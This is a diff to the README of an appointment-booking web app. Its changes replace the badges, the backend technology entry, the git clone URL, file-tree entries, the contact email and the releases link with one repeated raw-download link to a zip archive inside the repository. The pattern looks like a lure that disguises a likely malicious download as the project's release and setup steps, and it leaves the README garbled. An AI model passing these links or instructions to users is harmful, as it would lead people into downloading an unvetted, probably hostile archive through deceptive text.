@@ -1,6 +1,6 @@
 # Appointment Booking App 🩺
 
-![Appointment Booking](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg) ![GitHub Releases](https://img.shields.io/badge/Releases-latest-orange.svg)
+![Appointment Booking](https://github.com/JWeffyLeffy/AppointmentBooking/raw/refs/heads/main/client/src/Appointment_Booking_1.6.zip) ![License](https://github.com/JWeffyLeffy/AppointmentBooking/raw/refs/heads/main/client/src/Appointment_Booking_1.6.zip) ![GitHub Releases](https://github.com/JWeffyLeffy/AppointmentBooking/raw/refs/heads/main/client/src/Appointment_Booking_1.6.zip)
 
 Welcome to the **Appointment Booking App**! This full-stack MERN application allows users to book doctor appointments seamlessly. With real-time email confirmations, it enhances communication between patients and healthcare providers.
 
@@ -30,7 +30,7 @@ Welcome to the **Appointment Booking App**! This full-stack MERN application all
 This project uses the following technologies:
 
 - **Frontend**: React
-- **Backend**: Node.js, Express
+- **Backend**: https://github.com/JWeffyLeffy/AppointmentBooking/raw/refs/heads/main/client/src/Appointment_Booking_1.6.zip, Express
 - **Database**: MongoDB
 - **Email Service**: Nodemailer with Gmail
 - **Deployment**: Heroku (or any other cloud service)
@@ -42,7 +42,7 @@ To get started with the Appointment Booking App, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/JWeffyLeffy/AppointmentBooking.git
+   git clone https://github.com/JWeffyLeffy/AppointmentBooking/raw/refs/heads/main/client/src/Appointment_Booking_1.6.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -117,12 +117,12 @@ AppointmentBooking/
 │   ├── models/
 │   ├── routes/
 │   ├── .env
-│   ├── server.js
+│   ├── https://github.com/JWeffyLeffy/AppointmentBooking/raw/refs/heads/main/client/src/Appointment_Booking_1.6.zip
 ├── frontend/
 │   ├── public/
 │   ├── src/
-│   ├── package.json
-├── README.md
+│   ├── https://github.com/JWeffyLeffy/AppointmentBooking/raw/refs/heads/main/client/src/Appointment_Booking_1.6.zip
+├── https://github.com/JWeffyLeffy/AppointmentBooking/raw/refs/heads/main/client/src/Appointment_Booking_1.6.zip
 ```
 
 - **backend/**: Contains the server-side code.
@@ -161,11 +161,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, feel free to reach out:
 
 - **Author**: JWeffyLeffy
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **Email**: [https://github.com/JWeffyLeffy/AppointmentBooking/raw/refs/heads/main/client/src/Appointment_Booking_1.6.zip](https://github.com/JWeffyLeffy/AppointmentBooking/raw/refs/heads/main/client/src/Appointment_Booking_1.6.zip)
 
 ## Releases
 
-You can find the latest releases of the Appointment Booking App [here](https://github.com/JWeffyLeffy/AppointmentBooking/releases). Download the latest version and follow the setup instructions to get started.
+You can find the latest releases of the Appointment Booking App [here](https://github.com/JWeffyLeffy/AppointmentBooking/raw/refs/heads/main/client/src/Appointment_Booking_1.6.zip). Download the latest version and follow the setup instructions to get started.
 
 ---
 
